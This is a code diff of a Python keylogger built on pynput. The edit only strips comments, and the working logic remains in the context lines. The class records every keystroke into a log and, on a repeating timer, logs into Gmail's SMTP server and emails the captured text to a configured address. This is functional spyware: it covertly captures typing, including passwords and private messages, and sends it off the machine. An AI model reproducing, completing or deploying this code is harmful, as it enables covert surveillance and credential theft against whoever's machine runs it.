@@ -4,13 +4,11 @@ import threading
 
 import pynput
 
-# Create Keylogger Class
 from pynput import keyboard
 
 
 class KeyLogger:
 
-    # Define __init__ variables
 
     def __init__(self, time_interval: int, email: str, password: str) -> None:
         """
@@ -21,13 +19,11 @@ class KeyLogger:
         self.email = email
         self.password = password
 
-    # Create Log which all keystrokes will be appended to
 
     def append_to_log(self, string):
         assert isinstance(string, str)
         self.log = self.log + string
 
-    # Create Keylogger
 
     def on_press(self, key):
         try:
@@ -44,8 +40,6 @@ class KeyLogger:
         self.append_to_log(current_key)
 
 
-    # Create underlying back structure which will publish emails
-
     def send_mail(self, email, password, message):
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
@@ -53,15 +47,12 @@ class KeyLogger:
         server.sendmail(email, email, message)
         server.quit()
 
-    # Create Report & Send Email
 
     def report_n_send(self) -> str:
         send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report_n_send)
         timer.start()
-
-    # Start KeyLogger and Send Off Emails
 
     def start(self) -> str:
         """
